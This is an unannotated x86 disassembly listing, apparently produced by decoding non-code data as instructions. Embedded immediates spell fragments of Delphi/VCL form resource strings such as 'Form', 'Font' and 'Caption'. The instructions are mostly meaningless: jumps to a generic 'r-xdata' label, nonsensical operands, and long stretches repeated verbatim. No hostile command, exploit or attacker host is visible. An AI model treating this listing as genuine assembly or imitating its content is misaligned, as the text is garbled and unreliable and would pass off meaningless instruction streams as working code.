pshufw mm5 [ edi + 0x44 ] 0x65
jae r-xdata
jo r-xdata
inc esp
dec ecx
inc ebx
push 0x9646c69
jae r-xdata
shr [ ebx + ebp * 8 + 0xc060045 ] 0x54
add eax 0x14000000
or eax 0x73654449
imul esp [ edi + 0x6e ] 0x6f487265
inc eax
add [ eax + 0xf0045ea ] ch
inc esi
outsd
dec ebp
popad
imul ebp [ esi + 0x46 ] 0x436d726f
outsb
je r-xdata
outsd
outsb
add [ eax ] eax
add [ eax ] al
add [ edi ] al
add [ eax ] al
add al al
jmp r-xdata
jb r-xdata
push es
add eax 0x6d726f46
jae r-xdata
nop
insd
popad
jb r-xdata
adc [ eax + 0x6f ] dh
jo r-xdata
inc esi
outsd
jb r-xdata
jae r-xdata
add ecx [ edi ]
push esp
imul edi [ edx + 0x65 ] 0x796c6e4f
inc esp
popa
inc esp
popa
jne r-xdata
popad
dec ebp
je r-xdata
insd
imul edi [ edx + 0x65 ] 0x4d69620a
inc esp
dec ecx
inc esi
outsd
jb r-xdata
jb r-xdata
jb r-xdata
je r-xdata
outsb
insb
jns r-xdata
arpl [ edi + 0x6e ] bp
jae r-xdata
in al dx
inc eax
add [ ebp + ebp * 8 + 0x45 ] al
jne r-xdata
popa
jo r-xdata
in al dx
inc ebp
add [ ebx ] al
or edx [ eax + edx * 2 + 0x72 ]
imul ebp [ esi + 0x74 ] 0x6c616353
outsd
arpl [ ecx + 0x4e ] sp
outsd
outsb
push es
arpl [ ecx + 0x48 ] sp
imul esp [ ebp + 0x6 ] 0x72466163
or ah [ gs : ebx + 0x61 ]
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
in al dx
inc ebp
add [ esi ] al
add [ eax ] al
add [ eax ] al
add eax [ eax ]
add [ eax ] al
clc
inc esp
jae r-xdata
outsb
or al 0x54
inc ebx
insb
outsd
jae r-xdata
add [ esi ] eax
jb r-xdata
or [ ebp + ebp * 2 + 0x50 ] esp
cld
in al dx
inc ebp
add [ ebx ] al
or al 0x54
inc ebx
insb
outsd
jae r-xdata
push cs
je r-xdata
popad
je r-xdata
jb r-xdata
jo r-xdata
outsd
jb r-xdata
or esp [ esi + 0x73 ]
push ebx
je r-xdata
add eax 0x6d726f46
jo r-xdata
jmp r-xdata
pop eax
add [ eax ] cl
or edx [ ebx + eax * 2 + 0x6c ]
inc esp
jo r-xdata
dec esi
outsd
outsb
push cs
inc ebx
insb
outsd
inc ebp
jbe r-xdata
inc ebp
jbe r-xdata
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
add [ ecx + edx ] al
inc eax
add al bh
in al dx
inc ebp
add [ ebp - 0x1277ffc0 ] cl
inc ebp
add [ eax ] cl
adc [ ebx + eax * 2 + 0x6c ] dl
outsd
jae r-xdata
outsd
inc ebx
insb
push eax
jb r-xdata
jb r-xdata
outsd
outsb
imul esi [ edi + ebp * 2 + 0x72 ] 0x1
inc esi
outsd
jae r-xdata
add [ eax ] eax
add [ eax ] al
add [ ebx ] al
inc ecx
arpl [ ecx + ebp * 2 + 0x76 ] si
or al 0x64
insd
add [ ebx ] al
add [ eax ] eax
add [ eax ] al
outsb
je r-xdata
inc ebp
add [ esi ] al
or al 0x54
jns r-xdata
add [ gs : eax ] eax
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax + 0x60045ec ] dh
arpl [ ecx + 0x6c ] sp
in al dx
inc ebp
add [ ebx ] al
andps xmm0 [ ebp + 0x66 ]
push esp
push eax
dec edi
ja r-xdata
insd
popad
outsb
add al 0x57
outsd
jb r-xdata
pop es
inc edx
outsd
outsd
insb
popad
outsb
add [ ecx + edx ] al
inc eax
add [ eax ] al
adc [ eax ] al
nop
int3
jae r-xdata
outsb
je r-xdata
outsd
insb
popad
outsb
outsb
je r-xdata
outsd
outsd
insb
push ecx
jne r-xdata
jae r-xdata
jo r-xdata
push es
arpl [ ecx + 0x46 ] sp
jb r-xdata
outsb
je r-xdata
inc ebx
outsb
je r-xdata
jb r-xdata
imul ebp [ esi + 0x46 ] 0xc6d726f
insd
jb r-xdata
insb
jo r-xdata
bound ebp [ ecx + 0x48 ]
outsb
push esp
outsd
jo r-xdata
jb r-xdata
inc ebp
cmp al 0xe8
add [ esp + eax * 2 ] al
popad
je r-xdata
add cl [ eax ]
push es
add dl [ ecx ]
add ecx [ ebp + 0x73 ]
push es
push esp
push edi
dec ebp
dec ebx
jns r-xdata
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x440045ef ] ah
int1
inc ebp
add [ eax ] al
add [ eax ] al
cmp al 0x10
inc eax
add [ eax ] al
adc [ eax ] al
lea eax [ eax ]
lodsb [ esi ]
out dx al
jbe r-xdata
popad
outsb
add [ eax ] al
jb r-xdata
jb r-xdata
dec ebp
imul ebp [ esi + 0x69 ] 0x657a696d
add eax 0x6d726f46
jae r-xdata
or ah [ gs : ebx + 0x61 ]
add [ eax ] al
add al bh
jb r-xdata
adc [ eax + 0x6f ] esi
lea eax [ eax ]
pop esp
jmp r-xdata
inc esi
outsd
jb r-xdata
insd
outsd
add [ esp + edx + 0x1dc00042 ] bh
inc esi
add [ edi + ebx + 0x46 ] dh
pop es
dec ecx
outsb
je r-xdata
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x6 ] si
dec eax
popad
outsb
insb
pop es
inc edx
pop es
add [ eax ] al
add [ eax ] al
add dl al
out dx eax
inc ebp
add [ edx ] dh
int1
inc ebp
add al bh
add al [ eax ]
add [ eax + ebp * 8 ] bh
outsb
je r-xdata
jo r-xdata
inc ebp
jbe r-xdata
push ebx
outsb
jb r-xdata
or [ esi ] al
imul ebp [ edi + 0x6e ] 0x700c6c61
outsd
push eax
jb r-xdata
pushad
inc esi
outsd
jb r-xdata
add eax 0x6d726f46
jmp r-xdata
jae r-xdata
je r-xdata
jb r-xdata
add [ edi ] al
inc ebx
outsd
insd
add eax [ eax ]
pop es
add [ eax ] al
add [ eax ] al
adc [ eax ] al
or dh ch
inc ebp
add [ eax ] cl
or dl [ eax + ecx * 2 + 0x65 ]
insb
outsb
je r-xdata
outsb
je r-xdata
inc ebp
add [ esi ] al
add [ eax ] al
mov al 0xec
jae r-xdata
jne r-xdata
popad
inc esi
add ah ah
and al [ esi ]
xchg esp eax
lea eax [ eax + eax - 0x2c ]
adc al 0x42
add [ ebx + ebp + 0x46 ] bl
add [ eax - 0x3ffbdef ] ah
inc si
add [ esp + ebx ] dh
inc esi
add [ esi + edi * 8 ] al
inc esp
add [ eax ] ah
add eax [ ebp ]
insb
add al [ ebp ]
enter 0x4482 0x0
cmp al 0x44
add [ eax + ebp ] bh
inc esi
add [ eax + 0x100044f5 ] bh
add [ eax + eax + 0x14 ] 0x82
inc esp
add [ eax ] dh
sub [ esi ] eax
pushfd
mov dl 0x44
add [ ebp + ecx * 4 + 0x44 ] bh
add [ ebx + eax * 4 - 0x70f7ffbc ] cl
inc esp
add [ ebx + ebp ] ah
inc esi
add al dh
sub [ esi ] eax
inc eax
nop
inc esp
add [ ebx + ebp - 0x4cdfffba ] bl
inc esp
add [ esi + esi * 8 ] cl
inc esp
add al cl
test [ eax + eax - 0x3c ] 0xf1
inc esp
add [ esi + esi * 8 + 0x1b340044 ] ch
inc esi
add [ eax + 0x32 ] al
inc esi
add [ eax - 0x34 ] bh
inc esp
add [ edi + edi ] al
inc esi
add [ edx + eax * 2 + 0x46 ] ah
add [ eax ] ah
inc ecx
inc esi
add [ eax ] dl
int 0x44
add [ ecx * 8 + 0x439c0044 ] dl
inc esi
add [ ebx + ecx * 8 + 0x44 ] dh
add ah ch
test [ eax + eax - 0x70 ] 0xc000464a
or [ ebp ] eax
push 0xa40044f4
pop edi
inc esi
add [ eax ] ch
adc eax 0x17d80046
inc esi
add [ eax + edx * 2 + 0x20c00046 ] al
inc esi
add [ ecx ] bh
inc esi
add [ ebx + 0x1df80046 ] al
inc esi
add [ eax + 0x6800465e ] cl
inc ebp
inc esi
add [ eax ] bh
inc esi
add [ eax ] ah
sub eax [ esi ]
push cs
add [ eax ] al
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ eax + edx + 0x23c0040 ] dl
add [ eax ] al
movsb [ edi ] [ esi ]
0x2500045 0x0
lea eax [ ecx ]
pushfd
and [ esi ] eax
fsub [ ecx ]
add [ ebx + esi + 0x43e00040 ] al
inc esi
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add ah bl
pop ds
inc esi
add al dh
add al [ ebp ]
dec esp
and eax 0x8d140046
inc ecx
add [ ecx + 0x21d80046 ] bl
inc esi
inc ebx
popad
insb
insb
dec eax
insb
jo r-xdata
or [ ebx + 0x61 ] al
add cl [ eax ]
push es
push ebx
outsb
jb r-xdata
in eax dx
inc ebp
outsd
inc esi
imul esi [ ebp + eax + 0x46 ] 0x736d726f
pop es
inc edx
outsd
outsd
insb
popad
outsb
add [ eax ] dl
inc eax
add [ eax ] al
push 0x3c004010
adc [ eax ] al
add [ eax ] dl
inc eax
add [ ebp - 0x1153ffc0 ] cl
inc edx
outsd
add [ eax ] ecx
inc ebx
popad
outsb
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x8 ] si
sub_45ebbe
add [ eax + r-xdata ] dl
add ecx [ ecx ]
push esp
push eax
outsd
jae r-xdata
jo r-xdata
je r-xdata
inc esi
outsd
dec ebp
popad
imul ebp [ esi + 0x46 ] 0x436d726f
outsb
je r-xdata
outsd
outsb
add [ eax ] eax
add [ eax ] al
add [ edi ] al
add [ eax ] al
add al al
jmp r-xdata
push es
add eax 0x6d726f46
jae r-xdata
jb r-xdata
jb r-xdata
je r-xdata
in al dx
inc eax
add [ ebp + ebp * 8 + 0x45 ] al
popa
jo r-xdata
in al dx
inc ebp
add [ ebx ] al
or edx [ eax + edx * 2 + 0x72 ]
imul ebp [ esi + 0x74 ] 0x6c616353
add eax 0x6d726f46
jo r-xdata
jo r-xdata
jb r-xdata
add [ eax ] cl
or edx [ ebx + eax * 2 + 0x6c ]
inc esp
dec esi
outsd
outsb
push cs
inc ebx
insb
outsd
inc ebp
jbe r-xdata
jo r-xdata
push cs
je r-xdata
add [ gs : eax ] eax
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax + 0x60045ec ] dh
arpl [ ecx + 0x6c ] sp
jne r-xdata
in al dx
inc ebp
add [ ebx ] al
andps xmm0 [ ebp + 0x66 ]
popad
push esp
push eax
dec edi
ja r-xdata
or ah [ ebp + ebp * 2 + 0x4d ]
insd
push eax
adc [ eax + 0x6f ] dh
jo r-xdata
outsd
inc ebx
insb
push eax
jb r-xdata
insd
popad
outsb
add al 0x57
outsd
jb r-xdata
pop es
inc edx
outsd
outsd
insb
popad
outsb
add [ ecx + edx ] al
inc eax
add [ eax ] al
adc [ eax ] al
nop
int3
jae r-xdata
outsb
je r-xdata
jb r-xdata
outsd
outsb
imul esi [ edi + ebp * 2 + 0x72 ] 0x1
push es
arpl [ ecx + 0x46 ] sp
jb r-xdata
outsb
je r-xdata
jb r-xdata
nop
insd
popad
jb r-xdata
popad
dec ebp
inc esp
jae r-xdata
jae r-xdata
jo r-xdata
cmp al 0xe8
add [ esp + eax * 2 ] al
popad
je r-xdata
add cl [ eax ]
push es
je r-xdata
je r-xdata
push ecx
jne r-xdata
dec ebp
imul ebp [ esi + 0x69 ] 0x657a696d
add eax 0x6d726f46
jae r-xdata
or ah [ gs : ebx + 0x61 ]
arpl [ ecx + 0x4e ] sp
outsd
outsb
push es
arpl [ ecx + 0x48 ] sp
imul esp [ ebp + 0x6 ] 0x72466163
or ah [ gs : ebx + 0x61 ]
add [ eax ] al
add al bh
insd
outsd
jb r-xdata
outsd
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
in al dx
inc ebp
add [ esi ] al
add [ eax ] al
add [ eax ] al
add eax [ eax ]
add [ eax ] al
clc
je r-xdata
jb r-xdata
add [ esp + edx + 0x1dc00042 ] bh
inc esi
add [ edi + ebx + 0x46 ] dh
pop es
dec ecx
outsb
je r-xdata
outsb
or al 0x54
inc ebx
insb
outsd
jae r-xdata
add [ esi ] eax
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x6 ] si
inc esi
outsd
jb r-xdata
jae r-xdata
popad
outsb
add [ eax ] al
jb r-xdata
inc ebx
outsb
je r-xdata
inc ebp
jbe r-xdata
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
add [ ecx + edx ] al
inc eax
add al bh
in al dx
inc ebp
add [ ebp - 0x1277ffc0 ] cl
inc ebp
add [ eax ] cl
adc [ ebx + eax * 2 + 0x6c ] dl
outsd
jae r-xdata
jb r-xdata
jo r-xdata
push ebx
outsb
jb r-xdata
or [ esi ] al
imul ebp [ edi + 0x6e ] 0x700c6c61
outsd
push eax
jb r-xdata
je r-xdata
jb r-xdata
jb r-xdata
or [ ebp + ebp * 2 + 0x50 ] esp
cld
in al dx
inc ebp
add [ ebx ] al
or al 0x54
inc ebx
insb
outsd
jae r-xdata
inc ebp
cmp al 0x10
inc eax
add [ eax ] al
adc [ eax ] al
lea eax [ eax ]
lodsb [ esi ]
out dx al
jbe r-xdata
jo r-xdata
inc ebp
jbe r-xdata
jb r-xdata
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x440045ef ] ah
int1
inc ebp
add [ eax ] al
add [ eax ] al
outsd
insb
popad
outsb
outsb
je r-xdata
outsd
outsd
insb
add [ eax ] eax
add [ eax ] al
add [ ebx ] al
inc ecx
arpl [ ecx + ebp * 2 + 0x76 ] si
or al 0x64
insd
add [ ebx ] al
add [ eax ] al
add [ esp + ebp * 8 + 0x45 ] bl
add [ ecx ] cl
insd
inc esp
jae r-xdata
add [ eax ] eax
add [ eax ] al
outsb
je r-xdata
outsb
je r-xdata
inc esi
add ah ah
and al [ esi ]
xchg esp eax
lea eax [ eax + eax - 0x2c ]
adc al 0x42
add [ ebx + ebp + 0x46 ] bl
add [ eax - 0x3ffbdef ] ah
inc si
add [ esp + ebx ] dh
inc esi
add [ esi + edi * 8 ] al
inc esp
add [ eax ] ah
add eax [ ebp ]
insb
add al [ ebp ]
enter 0x4482 0x0
cmp al 0x44
add [ eax + ebp ] bh
inc esi
add [ eax + 0x100044f5 ] bh
add [ eax + eax + 0x14 ] 0x82
inc esp
add [ eax ] dh
sub [ esi ] eax
pushfd
mov dl 0x44
add [ ebp + ecx * 4 + 0x44 ] bh
add [ ebx + eax * 4 - 0x70f7ffbc ] cl
inc esp
add [ ebx + ebp ] ah
inc esi
add al dh
sub [ esi ] eax
inc eax
nop
inc esp
add [ ebx + ebp - 0x4cdfffba ] bl
inc esp
add [ esi + esi * 8 ] cl
inc esp
add al cl
test [ eax + eax - 0x3c ] 0xf1
inc esp
add [ esi + esi * 8 + 0x1b340044 ] ch
inc esi
add [ eax + 0x32 ] al
inc esi
add [ eax - 0x34 ] bh
inc esp
add [ edi + edi ] al
inc esi
add [ edx + eax * 2 + 0x46 ] ah
add [ eax ] ah
inc ecx
inc esi
add [ eax ] dl
int 0x44
add [ ecx * 8 + 0x439c0044 ] dl
inc esi
add [ ebx + ecx * 8 + 0x44 ] dh
add ah ch
test [ eax + eax - 0x70 ] 0xc000464a
or [ ebp ] eax
push 0xa40044f4
pop edi
inc esi
add [ eax ] ch
adc eax 0x17d80046
inc esi
add [ eax + edx * 2 + 0x20c00046 ] al
inc esi
add [ ecx ] bh
inc esi
add [ ebx + 0x1df80046 ] al
inc esi
add [ eax + 0x6800465e ] cl
inc ebp
inc esi
add [ eax ] bh
inc esi
add [ eax ] ah
sub eax [ esi ]
push cs
add [ eax ] al
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ eax + edx + 0x23c0040 ] dl
add [ eax ] al
movsb [ edi ] [ esi ]
0x2500045 0x0
lea eax [ ecx ]
pushfd
and [ esi ] eax
fsub [ ecx ]
add [ ebx + esi + 0x43e00040 ] al
inc esi
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add ah bl
pop ds
inc esi
add al dh
add al [ ebp ]
dec esp
and eax 0x8d140046
inc ecx
add [ ecx + 0x21d80046 ] bl
inc esi
inc ebx
popad
insb
insb
dec eax
insb
jo r-xdata
or [ ebx + 0x61 ] al
add [ eax ] al
add [ eax ] al
add dl al
out dx eax
inc ebp
add [ edx ] dh
int1
inc ebp
add al bh
add al [ eax ]
add [ eax + ebp * 8 ] bh
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
adc [ eax ] al
or dh ch
inc ebp
add [ eax ] cl
or dl [ eax + ecx * 2 + 0x65 ]
insb
outsb
je r-xdata
pushad
inc esi
outsd
jb r-xdata
add dl [ ecx ]
add ecx [ ebp + 0x73 ]
push es
push esp
push edi
dec ebp
dec ebx
jns r-xdata
imul ebp [ esi + 0x46 ] 0xc6d726f
insd
jb r-xdata
in eax dx
inc ebp
outsd
inc esi
imul esi [ ebp + eax + 0x46 ] 0x736d726f
pop es
inc edx
outsd
outsd
insb
popad
outsb
add [ eax ] dl
inc eax
add [ eax ] al
push 0x3c004010
adc [ eax ] al
add [ eax ] dl
inc eax
add [ ebp - 0x1153ffc0 ] cl
inc edx
outsd
add [ edi ] al
inc ebx
outsd
insd
add eax [ eax ]
pop es
add cl [ eax ]
push es
push ebx
outsb
jb r-xdata
inc ebp
add [ esi ] al
add [ eax ] al
mov al 0xec
jae r-xdata
dec eax
popad
outsb
insb
pop es
inc edx
pop es
adc [ eax + 0x6f ] esi
add [ eax ] ecx
inc ebx
popad
outsb
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x8 ] si
sub_45efba
fsubr st2
inc ebp
add [ edx + eax ] ah
add [ 0x14000f00 ] bh
add [ edi ] ah
add [ edi ] dh
add [ ecx + 0x200a100 ] al
add [ ecx ] dl
add [ edi ] edx
add [ eax ] esp
add [ edi ] ebx
add [ esi ] eax
add [ eax ] dl
add [ ecx ] dl
add [ edx ] dl
add [ eax ] ebx
add [ edx ] ah
add ch [ eax ]
add [ ecx ] dl
add dl [ ebx ]
and al 0x0
sbb al [ eax ]
inc esi
add [ eax - 0x50 ] al
aas
mov al 0x0
mov al 0x17
mov al 0x3c
mov al 0x1
mov al 0x5
mov al 0xd
mov al 0x10
mov al 0xe
mov al 0x15
mov al 0x19
mov al 0x1d
mov al 0x21
mov al 0x12
mov al 0x29
mov al 0x3d
mov al 0x8
mov al 0x44
mov al 0xb3
push [ edx - 0x13001201 ]
push [ ecx - 0x50004f01 ]
[ esi - 0x52000201 ]
sub_45f168
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov al 0xf2
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + esi * 8 + 0x2f80045 ] ah
add [ eax ] al
pushad
out dx al
inc ebp
add [ esp + edx + 0x1dc00042 ] bh
inc esi
add [ edi + ebx + 0x46 ] dh
add [ ebx + esi + 0x43e00040 ] al
inc esi
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add ah bl
pop ds
inc esi
add al dh
add al [ ebp ]
dec esp
and eax 0x8d140046
inc ecx
add [ ecx + 0x21d80046 ] bl
inc esi
add ah ah
and al [ esi ]
xchg esp eax
lea eax [ eax + eax - 0x2c ]
adc al 0x42
add [ ebx + ebp + 0x46 ] bl
add [ eax - 0x3ffbdef ] ah
inc si
add [ esp + ebx ] dh
inc esi
add [ esi + edi * 8 ] al
inc esp
add [ eax ] ah
add eax [ ebp ]
insb
add al [ ebp ]
enter 0x4482 0x0
cmp al 0x44
add [ eax + ebp ] bh
inc esi
add [ eax + 0x100044f5 ] bh
add [ eax + eax + 0x14 ] 0x82
inc esp
add [ eax ] dh
sub [ esi ] eax
pushfd
mov dl 0x44
add [ ebp + ecx * 4 + 0x44 ] bh
add [ ebx + eax * 4 - 0x70f7ffbc ] cl
inc esp
add [ ebx + ebp ] ah
inc esi
add al dh
sub [ esi ] eax
inc eax
nop
inc esp
add [ ebx + ebp - 0x4cdfffba ] bl
inc esp
add [ esi + esi * 8 ] cl
inc esp
add al cl
test [ eax + eax - 0x3c ] 0xf1
inc esp
add [ esi + esi * 8 + 0x1b340044 ] ch
inc esi
add [ eax + 0x32 ] al
inc esi
add [ eax - 0x34 ] bh
inc esp
add [ edi + edi ] al
inc esi
add [ edx + eax * 2 + 0x46 ] ah
add [ eax ] ah
inc ecx
inc esi
add [ eax ] dl
int 0x44
add [ ecx * 8 + 0x439c0044 ] dl
inc esi
add [ ebx + ecx * 8 + 0x44 ] dh
add ah ch
test [ eax + eax - 0x70 ] 0xc000464a
or [ ebp ] eax
push 0xa40044f4
pop edi
inc esi
add [ eax ] ch
adc eax 0x17d80046
inc esi
add [ eax + edx * 2 + 0x20c00046 ] al
inc esi
add [ ecx ] bh
inc esi
add [ ebx + 0x1df80046 ] al
inc esi
add [ eax + 0x6800465e ] cl
inc ebp
inc esi
add [ eax ] bh
inc esi
add [ eax ] ah
sub eax [ esi ]
add eax 0x726f4654
insd
mov eax eax
mov al 0xf2
inc ebp
add [ edi ] al
add eax 0x726f4654
insd
mov al 0xf1
inc ebp
add [ eax - 0xf ] al
inc ebp
add [ esi ] bl
add eax 0x6d726f46
jae r-xdata
add [ ecx ] al
add [ eax + esi * 2 ] bh
inc ecx
add [ eax + eax ] bh
add dh bh
clc
add [ eax + eax + 0x1 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
or eax 0x63410600
je r-xdata
add [ eax ] al
adc eax [ eax ]
or al [ ecx + 0x75 ]
je r-xdata
popad
inc edx
insb
outsb
push esp
adc [ eax ] al
loope r-xdata
outsd
outsb
pop esp
push edx
inc esp
add [ eax ] ah
add al [ eax ]
inc [ esp + eax * 2 + 0x46 ]
add ah al
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x410d000e ] al
arpl [ ecx + ebp * 2 + 0x76 ] si
inc ebx
outsd
outsb
je r-xdata
outsd
outsb
push ebx
arpl [ edx + 0x6f ] si
insb
insb
add [ eax ] dl
inc eax
add [ eax + eax ] bl
[ eax + eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc al 0x0
or [ ecx + 0x75 ] al
je r-xdata
insb
push 0x10046
add [ eax ] al
add [ eax ] al
add [ eax + 0xff ] al
adc [ eax ] eax
cmovno ebp [ eax + esi * 2 + 0x68 ]
popad
inc edx
insb
outsb
push esi
popad
insb
jne r-xdata
add bh bh
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sldt [ 0x67696c41 ]
outsb
add [ eax ] dl
inc eax
add al ah
add al [ eax ]
[ eax + 0x68 ]
inc esi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc [ eax ] al
or al [ ecx + 0x6c ]
jo r-xdata
outsd
insb
xor al 0x37
inc esp
add [ ebx ] bl
add bh bh
cwde
test [ eax + eax + 0x1 ] al
add [ eax ] al
add [ edi ] dl
add [ ebx ] cl
inc edx
outsd
jb r-xdata
0x2290045 0xff00
je r-xdata
push ebx
imul edi [ edx + 0x65 ] r-xdata
pop edi
add [ eax ] al
push [ eax ]
add dh bh
rcl [ eax + 0x44 ] 0x1
add [ eax - 0x80000000 ] al
adc eax 0x69420800
inc esp
imul ecx [ ebp + 0x6f ] 0xeba86564
inc ebp
add [ eax ] ch
add al [ eax ]
dec esp
xor eax [ esi ]
les esi [ esi ]
inc esi
add [ eax ] al
add [ eax ] al
add [ edi ] 0x0
add [ eax ] al
push ss
add [ ebx ] cl
inc edx
outsd
jb r-xdata
outsd
add [ ecx ] ah
add bh bh
fadd [ edx - 0x7c8bffbc ]
inc esp
add [ eax ] al
add [ eax ] al
add [ ebx ] 0x0
add [ eax ] al
adc al [ eax ]
pop es
inc ecx
outsb
arpl [ eax + 0x6f ] bp
jb r-xdata
fdivr [ esi ]
inc esp
int3
add [ eax ] dl
inc eax
add [ eax ] dl
add al [ eax ]
inc [ esi + edx + 0x27a80046 ]
inc esi
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sbb [ edx ] 0x0
or al 0x43
jb r-xdata
sbb [ edx ] ch
insb
push esp
dec ebp
inc esp
add [ ecx + eax ] ch
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43070019 ] al
popad
jo r-xdata
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4305001c ] al
outsd
insb
outsd
jb r-xdata
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430b001b ] al
insb
imul esp [ ebp + 0x6e ] 0x64695774
je r-xdata
insb
imul esp [ ebp + 0x6e ] 0x69654874
push 0x40103c74
add [ eax + 0x18004489 ] dh
sub al [ esi ]
jo r-xdata
add [ eax + 0x2a ] cl
inc esi
add [ eax + 0x27 ] dh
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430c001a ] al
popad
outsb
dec eax
and al 0x42
add [ eax ] dh
add bh bh
dec esp
xchg ecx eax
inc esp
add [ eax - 0x6f ] ch
inc esp
call 0xffffffff9544f51a
push 0x10046
add [ eax ] al
add [ eax ] al
add [ eax ] al
sbb eax 0x72541000
popad
outsb
jae r-xdata
imul ebp [ edi + 0x6e ] r-xdata
hlt
jb r-xdata
jae r-xdata
arpl [ edi + 0x6e ] bp
adc [ eax ] al
push ebp
jae r-xdata
popad
jb r-xdata
add [ eax ] al
add [ eax + 0x1 ] al
popad
jb r-xdata
inc esi
add [ eax + 0x27 ] dh
imul esp [ esp + esi * 2 + 0x68 ] r-xdata
lodsb [ esi ]
pop [ eax + eax - 0x24 ]
pop [ eax + eax - 0x3c ]
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esp
add [ eax ] 0x0
add [ eax ] al
outsb
je r-xdata
and [ eax ] al
add eax 0x336c7443
inc esp
add [ eax ] dl
inc eax
add [ edi + 0x6cff0001 ] ah
cli
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sbb cl bh
outsb
je r-xdata
and al 0x0
or [ edx + esi * 2 + 0x61 ] al
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
pop ebp
add [ eax ] al
jmp [ eax ]
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
in al dx
inc ebp
add [ ecx ] dh
add al [ eax ]
push [ ecx ]
add al [ eax ]
inc esp
inc esi
add [ eax ] al
add [ eax ] al
add [ ebx ] 0x0
add [ eax ] al
add [ eax ] eax
outsd
insb
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430b001f ] al
outsd
insb
outsd
jb r-xdata
dec ebp
outsd
add [ gs : eax ] dl
inc eax
add [ eax ] dl
add dh bh
add [ fs : eax ] al
inc [ eax ]
mov al 0x44
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add [ es : edi ] al
inc ebp
outsb
popad
bound ebp [ ebp + 0x64 ]
add [ eax ] dl
inc eax
add [ ecx ] bl
add bh bh
fcom [ eax + 0x10044 ]
je r-xdata
and [ eax ] eax
push cs
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
popad
insb
jne r-xdata
imul esi [ edi + ebp * 2 + 0x72 ] r-xdata
test al 0x1
add bh bh
mov ah 0xe3
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
and eax [ eax ]
or [ edi + ebp * 2 + 0x63 ] al
imul edx [ ebx + 0x69 ] 0x74
cmp [ gs : esi ] bh
inc esp
add [ ebx - 0x64010000 ] bl
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
jb r-xdata
outsd
outsb
jae r-xdata
add [ ebx ] cl
inc ebx
jae r-xdata
and al 0x42
add ah ch
add al [ eax ]
inc [ eax + 0x1004668 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
push ds
add [ 0x6e617254 ] dl
imul esp [ gs : edi + 0x68 ] 0x40109474
outsb
je r-xdata
cmp eax 0x5d0044
add bh bh
pushad
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
and eax 0x72440800
popad
outsd
outsb
outsd
arpl [ ebx + 0x4d ] bp
popad
outsb
popad
jb r-xdata
test [ edi ] bh
inc esp
add [ eax + eax ] dh
add [ eax ] al
and al [ eax ]
push cs
inc esp
popa
jne r-xdata
add eax [ eax ]
inc esp
add [ ecx + edi * 8 ] bh
inc esp
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
imul ebp [ esi + 0x74 ] 0x40100073
add [ ebp + 0x18ff0001 ] ah
stc
dec ecx
imul ebp [ ebp + 0xc ] 0x80045e6
add al [ eax ]
inc eax
push ss
inc esi
add ah al
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x480d000b ] al
outsd
jb r-xdata
cmp al 0x10
outsd
outsb
je r-xdata
inc ebp
add [ eax + 0x2 ] ah
add bh bh
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ cs : esi ] cl
dec edi
insb
inc ebx
push ebx
